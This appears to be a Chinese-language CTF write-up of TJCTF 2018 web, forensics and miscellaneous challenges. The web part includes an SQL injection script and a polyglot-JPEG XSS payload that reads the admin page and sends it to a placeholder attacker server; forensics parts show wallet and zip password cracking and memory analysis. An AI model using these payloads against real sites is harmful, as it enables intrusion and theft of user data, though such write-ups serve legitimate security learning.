<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_38.png" alt="img"></p>
<p>再看看网页</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_38_1.png" alt="img"></p>
<p>提示<code>This is what I got about you from the database: no such column: password</code></p>
<p>再看看响应的源代码</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_39.png" alt="img"></p>
<p>尝试</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_40.png" alt="img"></p>
<p>这里有检验<code>@</code>，试试bp能不能绕过</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_41.png" alt="img"></p>
<p>提示还是：<code>This is what I got about you from the database: no such column: password</code></p>
<p>尝试改改post的数据<code>password</code>-&gt;<code>passwd</code></p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_42.png" alt="img"></p>
<p>提示：<code>This is what I got about you from the database: no such column: passwd</code></p>
<p>到这里大概知道我们可以干啥了。。通过修改这个字段，让服务器查询出我们想得到的信息</p>
<p>根据上面的分析，或许使用python的request请求更加合适呢！</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_43.png" alt="img"></p>
<p>这里简单的sql测试,就可以得到大致的信息，包括题目所求的用户admin的ip地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://ess-kyoo-ell.tjctf.org'</span></span><br><span class="line"></span><br><span class="line">s=requests.Session()</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line"></span><br><span class="line">    <span class="string">"email"</span>:<span class="string">"' or 1=1 #"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">#"username or 1=1 --":""</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"(username or 1=1) and username = 'admin' --"</span>:<span class="string">""</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r=s.post(url,data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'\n'</span>.join(r.text.split(<span class="string">'\n'</span>)[<span class="number">174</span>:<span class="number">174</span>+<span class="number">18</span>])     <span class="comment">#只查看174~174+18行的网页源代码</span></span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p>得到运行结果</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"profile-name"</span> <span class="attr">class</span>=<span class="string">"profile-name-card"</span>&gt;</span>This is what I got about you from the database: &#123;&amp;#39;id&amp;#39;: 706, &amp;#39;username&amp;#39;: &amp;#39;admin&amp;#39;, &amp;#39;first_name&amp;#39;: &amp;#39;Administrative&amp;#39;, &amp;#39;last_name&amp;#39;: &amp;#39;User&amp;#39;, &amp;#39;email&amp;#39;: &amp;#39;[email&amp;#160;protected]&amp;#39;, &amp;#39;gender&amp;#39;: &amp;#39;Female&amp;#39;, &amp;#39;ip_address&amp;#39;: &amp;#39;145.3.1.213&amp;#39;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>答案即是tjctf{145.3.1.213}</p>
<h5 id="Web-Stupid-blog"><a href="#Web-Stupid-blog" class="headerlink" title="Web_Stupid blog"></a>Web_Stupid blog</h5><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_44.png" alt="img"></p>
<p>打开页面，有注册和登录，那就是注册再登录试试咯</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_45.png" alt="img"></p>
<p>注册了个账号，jianghuxia ,登录后发现自己的主页url是：<code>https://stupid_blog.tjctf.org/jianghuxia</code></p>
<p>推测每个username的页面是<code>https://stupid_blog.tjctf.org/&lt;username&gt;</code>，那么先尝试下<code>https://stupid_blog.tjctf.org/admin</code>，得到下图提示</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_46.png" alt="img"></p>
<p>仔细看看页面，发现有3个模块：<code>Report a User、Update Profile Picture (png, jpg)、Save</code></p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_47.png" alt="img"></p>
<p>感觉似曾相识em~~~流程大概是这么一个样，上传个人资料图片（JPEG / PNG），在个人“Posts”上设置帖子，最后提交给管理员，如果这样的话，考察的就是XSS咯</p>
<p>那么先测试一波上传，测试途中，发现了<a href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%D5%A5%A3%A1%BC%A5%EB%B2%E8%C1%FC" target="_blank" rel="noopener">配置文件图像</a>的固定URL是：<code>https://stupid_blog.tjctf.org/&lt;Username&gt;/pfp</code></p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_48.png" alt="img"></p>
<p>尝试过抓包冒充扩展名，但会发现因为是固定的路径，所以就算上传成功后，都是一张默认用户的图片，如果要进行其他的测试也是行不通的</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_49.png" alt="img"></p>
<p>尝试上传正常的图片，会发现正常显示，且访问路径<code>https://stupid_blog.tjctf.org/&lt;Username&gt;/pfp</code></p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_50.png" alt="img"></p>
<p>会跳转到刚刚的上传文件的下载</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_51.png" alt="img"></p>
<p>到此，大致能分析出后台具有挺严格的图片上传过滤规则，那么现在是能在图片数据域里做手脚了。。</p>
<p>再测试XSS的时候，几经测试，发现又具有严格的CSP规则。。。</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_52.png" alt="img"></p>
<p>em~~~那现在方向和思路都很明显了</p>
<p>通过XSS使用JPG或者png文件上传绕过CSP（Content-Security-Policy）</p>
<p>而关键的是，我们要把XSS的关键代码写入JPG中，绕过CSP</p>
<p>尝试了几波无果，没思路咯，网上搜了一番，嘿嘿，找到个跟这个好像的 ：</p>
<p><a href="https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs" target="_blank" rel="noopener">https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs</a></p>
<p>根据这篇文章分析，贼有意思，此文作者研究了JPG的文件格式，把脚本隐藏在了jpg图像中，orz…</p>
<p>首先，jpg文件格式的头部：</p>
<p>前4个字节是jpg文件头，随后2个字节，代表后面所填充的JPEG标头的长度</p>
<p><code>FF D8 FF E0 2F 2A 4A 46 49 46 00 01 01 01 00 48 00 48 00 00 00 00 00 00 00 00 00 00</code></p>
<p>接着，表示jpg数据域的开始的两个字节：<code>FF FE</code>，其后面紧跟两个代表数据域长度的字节</p>
<p>比如：<code>FF FE 00 1C 2A 2F 3D 61 6C 65 72 74 28 22 42 75 72 70 20 72 6F 63 6B 73 2E 22 29 3B 2F 2A</code></p>
<p><code>0xFF</code>，<code>0xFE</code>代表数据域开始，<code>0x00</code>，<code>0x1C</code>代表后面数据的长度加上这两个字节的本身长度。<code>0x001C</code>化为十进制代表28个字节，也就是56位</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_53.png" alt="img"></p>
<p>最后，JPG的文件尾部<code>2A 2F 2F 2F FF D9</code></p>
<p><code>0xFF、0xD9</code>代表JPG文件尾部的最后2个字节，意味着JPG文件的结束.</p>
<p>如此，当把代码<code>/=alert(&quot;Burp rocks.&quot;);/*</code>插入到一张jpg中，将是下面格式</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_54.png" alt="img"></p>
<p>接着回到题目先上传该文件，上传成功后，你可以访问<code>https://stupid_blog.tjctf.org/&lt;Username&gt;/pfp</code></p>
<p>下载这时的pfp文件，验证是否跟上传的一样</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_55.png" alt="img"></p>
<p>可以发现一模一样，意味着成功往JPG中写入了代码，再看看能不能执行</p>
<p>Post填入</p>
<p><code>&lt;script charset=&quot;ISO-8859-1&quot; src=&quot;/jianghuxia/pfp&quot;&gt;&lt;/script&gt;</code></p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_56.png" alt="img"></p>
<p>SAVE，就会弹出提示框</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_57.png" alt="img"></p>
<p>很好，我们成功了。那么接下来只需要简单改改上传图片中的代码，然后进行相同的操作，最后再进行一步“Report a User”就行。</p>
<p>现在需要写入的是：</p>
<p><code>*/=x=new XMLHttpRequest();x.open(&quot;GET&quot;,&quot;admin&quot;,false);x.send(null);document.location=&quot;http://&lt;your severhost&gt;/j&quot;+x.responseText;/*</code></p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_58.png" alt="img"></p>
<p>按照刚刚的填充JPG文件方法，计算长度</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_59.png" alt="img"></p>
<p>再加上前面2个代表长度的标识字节,264+2*2=268,268/2=134，再转16进制，为0x86。再加上JPG的文件头尾格式，得到下图</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_60.png" alt="img"></p>
<p>上传文件，并且上传完成后再SAVE一遍Posts</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_61.png" alt="img"></p>
<p>报告提交给admin</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_62.png" alt="img"></p>
<p>提交成功</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_63.png" alt="img"></p>
<p>然后坐等自己服务器日志收到的新信息</p>
<p><img src="/2018/08/13/tjctf2018/tjctf2018_web_64.png" alt="img"></p>
<p>web已完毕，其他待续。。。。。。。。。</p>
<p>本文由安全客原创发布<br>以上转载来自<code>安全客</code>：<a href="https://www.anquanke.com/post/id/156434" target="_blank" rel="noopener">TJCTF 2018 Web专题全解析</a><br>安全客 - 有思想的安全新媒体</p>
<p>这次TJCTF 2018，新姿势的确多多，以下是这次比赛Miscellaneous&amp;Forensics的专题解析。</p>
<p>菜鸡水平有限，有一道Forensics题，两道Misc至赛后依旧未解出来，相关附件会在之后给出，以下是这次TJCTF的Miscellaneous&amp;Forensics的相关writeup。</p>
<h4 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h4><h5 id="Forensics-Weird-Logo"><a href="#Forensics-Weird-Logo" class="headerlink" title="Forensics_Weird Logo"></a>Forensics_Weird Logo</h5><p><img src="/2018/08/13/tjctf2018/1534247353801.png" alt="1534247353801"></p>
<p>下载下来是个图片，<code>StegSolve</code>偏移几下，em~</p>
<p><img src="/2018/08/13/tjctf2018/1534436664656.png" alt="img"> </p>
<h5 id="Forensics-Lexington-State-Bank"><a href="#Forensics-Lexington-State-Bank" class="headerlink" title="Forensics_Lexington State Bank"></a>Forensics_Lexington State Bank</h5><p><img src="/2018/08/13/tjctf2018/1534407649282.png" alt="1534407649282"></p>
<p>这题说难也难，说简单也简单，运用到工具Zsteg，这是个好东西，清晰检测图片每个域的内容，如果上个月打过<code>Isitdtu ctf2018</code>，相信很快做出来，一个命令的事。LSB隐写不是问题。。。。</p>
<p><img src="/2018/08/13/tjctf2018/1534436687879.png" alt="1534436687879"></p>
<h5 id="Forensics-Grid-Parser"><a href="#Forensics-Grid-Parser" class="headerlink" title="Forensics_Grid Parser"></a>Forensics_Grid Parser</h5><p><img src="/2018/08/13/tjctf2018/1534407683684.png" alt="1534407683684"></p>
<p>下载下来，拖到winhex里发现有个<code>PK</code>头，改后缀<code>.zip</code>，打开，尝试一波操作，发现目录<code>movies.grid.zip\xl\media\password.png</code>，非常之可疑解压，拖到winhex里去</p>
<p><img src="/2018/08/13/tjctf2018/1534436650329.png" alt="img"></p>
<p>果不其然有个<code>zip</code>，提取出来发现是加密的，爆破（这里爆破，没想到就是两位字母，还去用字典跑，回头看看前面png两个**顿时明白了）</p>
<p><img src="/2018/08/13/tjctf2018/1534436636049.png" alt="img"></p>
<p>解压打开咯，其实这也是个送分题</p>
<p><img src="/2018/08/13/tjctf2018/1534436619713.png" alt="1534436619713"></p>
<h5 id="Forensics-Weird-Audio-Circuit"><a href="#Forensics-Weird-Audio-Circuit" class="headerlink" title="Forensics_Weird Audio Circuit"></a>Forensics_Weird Audio Circuit</h5><p><img src="/2018/08/13/tjctf2018/1534407714132.png" alt="1534407714132"></p>
<p>下载下来是个音频文件，不过这题贼变态，之前遇到过一道类似的题目，运用傅里叶级数变幻，通过<code>Adobe Audition CC2017</code>调出彩频图可以看出隐藏的key。这道题<code>Adobe Audition CC2017</code>折磨半天，知道是频率的问题，但是硬是没解出来。原来要运用<code>Nyquist</code> （奈奎斯特）公式，过滤掉特殊频率，这我真的学不来。。orz</p>
<p><img src="/2018/08/13/tjctf2018/1534414794935.png" alt="1534414794935"></p>
<p>下面的相关学习链接：<code>https://wiki.audacityteam.org/wiki/Nyquist_Basics:_The_Audacity_Nyquist_Prompt</code></p>
<p>看了大佬的<a href="https://www.youtube.com/watch?v=ZLO1LipkSFc" target="_blank" rel="noopener">题解</a>,了解了个大概，复现一遍，需要下载<code>audacity</code>，然后打开文件，进行下列操作</p>
<p><img src="/2018/08/13/tjctf2018/1534414344260.png" alt="1534414344260"></p>
<p>添加<code>Nyquist</code>命令<code>(lowpass8 (mult *track* (hzosc 10000)) 10000)</code></p>
<p><img src="/2018/08/13/tjctf2018/1534414385815.png" alt="1534414385815"></p>
<p>点击确定，点击播放按钮，大概在35~49秒会有声音读出flag，最终flag就不放出了（贼恐怖，英语听力很重要，听都是放慢听）</p>
<h5 id="Forensics-Ssleepy"><a href="#Forensics-Ssleepy" class="headerlink" title="Forensics_Ssleepy"></a>Forensics_Ssleepy</h5><p><img src="/2018/08/13/tjctf2018/1534407751950.png" alt="1534407751950"></p>
<p>这题其实跟<code>2018DDCTF</code>的流量分析题差不多，考察点<code>ssl</code>解密。下载下来是个数据包，看下<code>tcp</code>流，发现传输的是<code>ftp</code>，追踪下，可以看到流0有个<code>ftp</code>登陆、传输文件的操作（有个key.zip）</p>
<p><img src="/2018/08/13/tjctf2018/1534436729219.png" alt="img"></p>
<p>往后翻翻会发现，一个<code>zip</code></p>
<p><img src="/2018/08/13/tjctf2018/1534436744256.png" alt="img"></p>
<p>原始数据保存，打开，发现是个ftp服务的私钥，嗯，接下来思路就清晰了，需要私钥解密ssl，查看完整的数据包</p>
<p><img src="/2018/08/13/tjctf2018/1534436757826.png" alt="img"></p>
<p>按照要求填写</p>
<p><img src="/2018/08/13/tjctf2018/1534436766535.png" alt="img"></p>
<p><img src="/2018/08/13/tjctf2018/1534436823741.png" alt="img"></p>
<p>可以看到完整的<code>http</code>请求，那<code>http</code>响应呢？在<code>ssl</code>流里呗，追踪下响应的<code>ssl</code>流，可以看到很明显的<code>jpg</code>图片头部</p>
<p><img src="/2018/08/13/tjctf2018/1534436838238.png" alt="img"></p>
<p>原始数据保存，然后删除前面的<code>http</code>头部即可得到一张<code>flag</code>图片</p>
<p><img src="/2018/08/13/tjctf2018/1534436855531.png" alt="img"></p>
<p>这里有个插曲——提交图片中的<code>flag</code>一直不对，，后面看了下官方讨论组的通知：</p>
<p><img src="/2018/08/13/tjctf2018/1534436866369.png" alt="img"></p>
<p>额。。。。。</p>
<h5 id="Forensics-We-Will-Rock-You"><a href="#Forensics-We-Will-Rock-You" class="headerlink" title="Forensics_We Will Rock You"></a>Forensics_We Will Rock You</h5><p><img src="/2018/08/13/tjctf2018/1534407799296.png" alt="1534407799296"></p>
<p>仔细看了下题目，<code>Rock you</code>,em~,下意识想起了<code>kali</code>中<code>wordlists</code>中的<code>rockyou.txt</code>，明显爆破</p>
<p>这里拿出之前做题的一个<a href="https://github.com/gurnec/btcrecover" target="_blank" rel="noopener">好东西</a>（强烈建议大家把这个项目玩熟，贼有用）然后执行以下命令。</p>
<p><code>$ python btcrecover.py --passwordlist rockyou.txt --wallet wallet.dat --utf8 --max-eta 9999</code></p>
<p><img src="/2018/08/13/tjctf2018/1534417710884.png" alt="1534417710884"></p>
<p>最终<code>flag:tjctf{tinkerbell}</code></p>
<h5 id="Forensics-Moar-Turtles"><a href="#Forensics-Moar-Turtles" class="headerlink" title="Forensics_Moar Turtles"></a>Forensics_Moar Turtles</h5><p><img src="/2018/08/13/tjctf2018/1534407860905.png" alt="1534407860905"></p>
<p>看题目意思，<code>XBOX 360</code> 是啥，哦，原来是个游戏手柄啊。下载下来有两个文件</p>
<p><img src="/2018/08/13/tjctf2018/1534418834784.png" alt="1534418834784"></p>
<p>打开第一个，usb数据，这下，终于不怕了，上个月做了巅峰极客比赛，刚好复习了一遍</p>
<p><img src="/2018/08/13/tjctf2018/1534418809740.png" alt="1534418809740"></p>
<p>tshark提取关键数据</p>
<p><img src="/2018/08/13/tjctf2018/1534419241715.png" alt="1534419241715"></p>
<p>然后，又不会了，因为这不是鼠标的操作数据呀。继续网页搜索，找到咯：<code>http://tattiebogle.net/index.php/ProjectRoot/Xbox360Controller/UsbInfo</code></p>
<p>看了看，发现自己还是天真了。。。。游戏操作手柄，一秒钟可以有多个操作，我还必须记录usb数据流量包的时间，后面重新通过tshark提取流量包，命令：<code>tshark -r flag.pcapng -T fields -e frame.time_relative -e usb.capdata &gt; result.txt</code>，得到下图</p>
<p><img src="/2018/08/13/tjctf2018/1534420390839.png" alt="1534420390839"></p>
<p>后面琢磨半天，脚本写出来一半，比赛结束了 ，后面继续肝着，进展很小，看了看大佬们的解题思路，思路还是没错的。这里直接放出大佬们的<a href="http://www.aperikube.fr/docs/tjctf_2018/moarturtles/" target="_blank" rel="noopener">writeup</a>,学艺不精，告辞。</p>
<h5 id="Forensics-Volatile-Virus"><a href="#Forensics-Volatile-Virus" class="headerlink" title="Forensics_Volatile Virus"></a>Forensics_Volatile Virus</h5><p><img src="/2018/08/13/tjctf2018/1534407904951.png" alt="1534407904951"></p>
<p>这题，贼好玩，好玩到，从晚上19点开始做题，快到凌晨3点才做出来。下载文件3.6G，哇哦，看起来就好好玩。</p>
<p><img src="/2018/08/13/tjctf2018/1534436887289.png" alt="img"> </p>
<p>em~搜索了下，发现是<code>dmp</code>文件，这个简单就是电脑突然蓝屏后，会生成一个<code>dmp</code>文件供用户检测和分析原因。</p>
<p>搜索过程中，我还找到了分析此<code>dmp</code>文件的工具<code>Windbg</code>，但是打开分析，发现这个<code>dmp</code>文件是32位的<code>win7</code>的数据。尴尬，因为不同系统查看不同系统的<code>dmp</code>文件，因为指令集的差别，会导致分析结果不准确，也就是说W10的<code>Windbg</code>查看<code>win7</code>的<code>dmp</code>文件是行不通的。于是我又去找适合win7的<code>windbg</code>版本，但是，官网的下载链接都失效了，也是很无奈。</p>
<p><img src="/2018/08/13/tjctf2018/1534422298815.png" alt="1534422298815"></p>
<p>接着，我尝试各种搜索，运气挺好的收到几篇很棒的文章<a href="http://www.yingzinanfei.com/2016/09/22/volatilityanzhuangjishiyong/" target="_blank" rel="noopener">volatility安装及使用</a>/<a href="http://jxnu.hetianlab.com/html/news/news-2017082601.html" target="_blank" rel="noopener">内存取证三项CTF赛题详解 </a>/<a href="http://www.freebuf.com/column/152545.html" target="_blank" rel="noopener">CTF内存取证入坑指南！稳！</a> , 这让我认识了一个很强大的内存分析工具：<code>Volatility</code></p>
<p>以上链接建议浏览完，再继续往下走</p>
<p>命令<code>volatility_2.6_win64_standalone.exe -f file.dmp imageinfo</code>获取此dmp的关键信息</p>
<p><img src="/2018/08/13/tjctf2018/1534424302081.png" alt="1534424302081"></p>
<p>正常情况下，<code>AS Layer1</code>的第一个系统消息就是正确的dmp文件对应的系统，所以接下来，我们都将以<code>Win7SP1x86_23418</code>为其系统版本，执行相关的命令。</p>
<p>接着我们查看下列举缓存在内存的注册表 ，命令<code>volatility_2.6_win64_standalone.exe -f file.dmp --profile=Win7SP1x86_23418 hivelist</code></p>
<p><img src="/2018/08/13/tjctf2018/1534424553036.png" alt="1534424553036"></p>
<p>当然，在这里，你可以一个一个去尝试查看他们注册表的详细信息，不过，嘿嘿，等你看了，头就会大了。</p>
<p>查看进程，命令 <code>volatility_2.6_win64_standalone.exe -f file.dmp --profile=Win7SP1x86_23418 pslist</code></p>
<p><img src="/2018/08/13/tjctf2018/1534424769441.png" alt="1534424769441"></p>
<p>在进行到这步时，我仔细上网搜索的每个进程，如果百度出来是windows的应用，那很好，否则，可以怀疑它是木马文件。这里简直坑，在我进行到这步时，有一个<code>DumpIt.exe</code>,我判断它可能为木马文件，而后面的操作也确实证明它大几率是木马文件，仔细分析了很久，但是出题人出题用意不在这，所以我百忙活好久之后，直到拿到正确答案后，还是觉得不可思议。因为，观察到<code>DumpIt.exe</code>，所以我尝试把它提取出来。</p>
<p>命令<code>volatility_2.6_win64_standalone.exe -f file.dmp --profile=Win7SP1x86_23418 memdump -p 3172 -D xixi/</code></p>
<p><img src="/2018/08/13/tjctf2018/1534425618558.png" alt="1534425618558"></p>
<p>这里还有个小坑：</p>
<p><code>0x85115c00 DumpIt.exe  3172   2292      6       93      1      0 2018-08-06 03:58:14 UTC+0000</code></p>
<p>对于这个而言，有两个ID，一个是3172，一个是2292，提取的时候，用的是第一个3172，而不是链接讲的第二个</p>
<p>虽然提取成功后，但是分析时遇到困难，因为这是个数据文件，正常思维下，我们会用binwalk和foremost去尝试分解，而这次，我第一次遇到，虚拟机<code>binwalk</code>分解<code>Dumpit.exe</code>提取出来的dmp文件，虚拟机竟然竟然满了，我尝试了好多遍，甚至重新安装了虚拟机，这个时候，我感觉可能真是我思路错了。</p>
<p>后面继续执行命令<code>volatility_2.6_win64_standalone.exe -f file.dmp --profile=Win7SP1x86_23418 filescan</code> </p>
<p><img src="/2018/08/13/tjctf2018/1534426177122.png" alt="1534426177122"></p>
<p>发现报错了，别担心，输出到一个txt文件就行（这tm也算是一个小坑把），然后你打开那个txt,你会发现贼多的东西。我在这里面浪啊，找啊，前面翻翻，后面瞧瞧，因为在前面进程中，还看到了python.exe,随意搜下<code>.py</code>，没想到搜到个py文件<code>keylogger.py</code> ，再看看它在的目录，天啊，我好像发现了啥</p>
<p><img src="/2018/08/13/tjctf2018/1534426710640.png" alt="1534426710640"></p>
<p>根据前面标识号抓出来</p>
<p><img src="/2018/08/13/tjctf2018/1534427041573.png" alt="1534427041573"></p>
<p>得到了这个</p>
<p><img src="/2018/08/13/tjctf2018/1534426960366.png" alt="1534426960366"></p>
<p>看下内容</p>
<p><img src="/2018/08/13/tjctf2018/1534427078162.png" alt="1534427078162"></p>
<p>很好，我看到了另一个文件<code>C:\\Users\\IEUser\\AppData\\Local\\Temp\\logs.pkl</code></p>
<p>再到刚刚的1.txt里找下，有以下三处：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x000000000f275d50      3      0 R--rwd \Device\HarddiskVolume1r\AppData\Local\Temp\logs.pkl</span><br><span class="line">0x00000000185883d8      8      0 -W-rw- \Device\HarddiskVolume1\Users\IEUser\AppData\Local\Temp\logs.pkl</span><br><span class="line">0x00000000decc23d8      8      0 -W-rw- \Device\HarddiskVolume1\Users\IEUser\AppData\Local\Temp\logs.pkl</span><br></pre></td></tr></table></figure>
<p>但是符合的应该是第二个和第三个：</p>
<p>执行命令<code>volatility_2.6_win64_standalone.exe -f file.dmp --profile=Win7SP1x86_23418 dumpfiles -Q 0x00000000185883d8 -D .</code></p>
<p><img src="/2018/08/13/tjctf2018/1534427503363.png" alt="1534427503363"></p>
<p>logs.pkl这里指的应该是<code>pickle data</code> ，百度下<code>pickle data</code> 就会有如何使用python操作</p>
<p><img src="/2018/08/13/tjctf2018/1534427886300.png" alt="1534427886300"></p>
<p>这tm什么鬼，不过细心观察，我找到了点东西</p>
<p><img src="/2018/08/13/tjctf2018/1534428164269.png" alt="1534428164269"></p>
<p>中间那些阴影处，看到了吗，对照下虚拟键码对照表，拼接下就是<code>TJCTF{TH1S_1S_N0T_A_V1RU5_</code> ，其实，这题还没完，那个时候我看到TJCTF贼开心，然后，呵呵。做到这里我有没思路了，看了看题目<img src="/2018/08/13/tjctf2018/1534428438853.png" alt="1534428438853"></p>
<p>下载东西，嗯？浏览器，想起之前进程还有<code>chrome.exe</code>，再去试试，但是你会发现，又不行了，因为上面有三个<code>chrome.exe</code>。呵呵呵。。。。。。怎么办，继续，百度，谷歌，github查找资料</p>
<p>后面中搜查到<code>Volatility</code> 的插件，找到了<a href="https://blog.superponible.com/2014/08/31/volatility-plugin-chrome-history/" target="_blank" rel="noopener">这个</a>, 卧槽，有点激动，可以直接提取。</p>
<p>不过，又来了个坑，windows下的好像不能支持扩展，只能在ubuntu虚拟机下重新下载咯。（这里按照上面的链接就好）好了之后，开始操作：<code>vol.py --plugins=/home/jianghu/Documents/tjctf2018/volatility-plugins -f file.dmp --profile=Win7SP1x86_23418 chromedownloads --output csv &gt; downloaded_files.csv</code></p>
<p><img src="/2018/08/13/tjctf2018/1534433941576.png" alt="1534433941576"></p>
<p>成功，拿出来看看</p>
<p><img src="/2018/08/13/tjctf2018/1534434040565.png" alt="1534434040565"></p>
<p>找了半天。。。额。。。mmp,最后发现需要自己一个一个去测排序，像下面这样，按照某个值去排序<img src="/2018/08/13/tjctf2018/1534434128974.png" alt="1534434128974"></p>
<p>最后，再折腾了下按照<code>received_bytes</code>的大小排序，保证<code>7854}</code>在底部，最后按照<code>received_bytes</code>的大小，从小往大将每行文件尾部累加起来。</p>
<p><img src="/2018/08/13/tjctf2018/1534434883208.png" alt="1534434883208"></p>
<p>什么，你要写脚本？也行，不过有个小技巧，复制，粘贴，替换</p>
<p><img src="/2018/08/13/tjctf2018/1534435182671.png" alt="1534435182671"></p>
<p>然后随便复制到哪个输入框，最后替换掉空格就行了，得到：</p>
<p><code>D73C00EDD0C6F9FD2D9ED2D9E80CBDBE1C494A699E87AAB38B7139DE0B284581C8042C8042C968C5BA5571568EA7037A7037A70375603AF425A238823F6951FA712EEA8B0A9173830C113E76E08FBA833F47BE2CDB2DD8089A9206910445CD445CD445CDA7DFE792C18C4F4FE6B8AF4A560291E09832AC882AC88112E8ED80DED80DED80D02F601D21850D6CF3FBC5CD90D6A89396172757E3F6A6DE516C94491CB1C0A3146C45AB85B669F38D4297BA58CC8B91792F1A51491867D3D0E8401319E8A4812F501F5701F57E3CCD0FB71521B6BD86F3ACBB2E887181F0E71C20F32DC65BC5BEC8C1728BC391CEECF8530A3864C86B545F5ECDA182941F9C27CC11B53FB9865E7D2730A42B8A87854}</code></p>
<p>再把之前得到的flag拼接下（还是有坑，之前的前半截flag要先转化为小写，再拼接）</p>
<p><code>tjctf{th1s_1s_n0t_a_v1ru5_D73C00EDD0C6F9FD2D9ED2D9E80CBDBE1C494A699E87AAB38B7139DE0B284581C8042C8042C968C5BA5571568EA7037A7037A70375603AF425A238823F6951FA712EEA8B0A9173830C113E76E08FBA833F47BE2CDB2DD8089A9206910445CD445CD445CDA7DFE792C18C4F4FE6B8AF4A560291E09832AC882AC88112E8ED80DED80DED80D02F601D21850D6CF3FBC5CD90D6A89396172757E3F6A6DE516C94491CB1C0A3146C45AB85B669F38D4297BA58CC8B91792F1A51491867D3D0E8401319E8A4812F501F5701F57E3CCD0FB71521B6BD86F3ACBB2E887181F0E71C20F32DC65BC5BEC8C1728BC391CEECF8530A3864C86B545F5ECDA182941F9C27CC11B53FB9865E7D2730A42B8A87854}</code></p>
<p>再转换成MD5就好了，最后答案：<code>0be1ffc97da3488ae7f25bcbf966cb73</code> </p>
<p><img src="/2018/08/13/tjctf2018/1534435760034.png" alt="1534435760034"></p>
<h4 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h4><h5 id="Miscellaneous-Trippy"><a href="#Miscellaneous-Trippy" class="headerlink" title="Miscellaneous_Trippy"></a>Miscellaneous_Trippy</h5><p><img src="/2018/08/13/tjctf2018/1534247371572.png" alt="1534247371572"></p>
<p>打下载下来是个gif文件，一波试水，最后万万没想到，<code>winhex</code>打开搜索下tjctf就出来答案了<img src="/2018/08/13/tjctf2018/1534246708218.png" alt="1534246708218"></p>
<p>如图</p>
<p><img src="/2018/08/13/tjctf2018/1534436916430.png" alt="img"></p>
<h5 id="Miscellaneous-Discord"><a href="#Miscellaneous-Discord" class="headerlink" title="Miscellaneous_Discord!"></a>Miscellaneous_Discord!</h5><p><img src="/2018/08/13/tjctf2018/1534247383062.png" alt="1534247383062"></p>
<p>这个是比赛第二天出来的“签到题”，加入讨论组就有flag，这个就不展示啦</p>
<h5 id="Miscellaneous-Interference"><a href="#Miscellaneous-Interference" class="headerlink" title="Miscellaneous_Interference"></a>Miscellaneous_Interference</h5><p><img src="/2018/08/13/tjctf2018/1534247407499.png" alt="1534247407499"></p>
<p>这题。。呼~这题脑洞有点大，细看两个图片差不多,大小也差不多</p>
<p><img src="/2018/08/13/tjctf2018/1534248009144.png" alt="1534248009144"></p>
<p>盲水印试水一波，发现得到一个蓝色的图片…….</p>
<p><img src="/2018/08/13/tjctf2018/1534248225030.png" alt="1534248225030"></p>
<p>后面发现思路错了，正确思路是使用StegSolve将v1.png和v2.png进行如下操作</p>
<p><img src="/2018/08/13/tjctf2018/1534248361641.png" alt="1534248361641"></p>
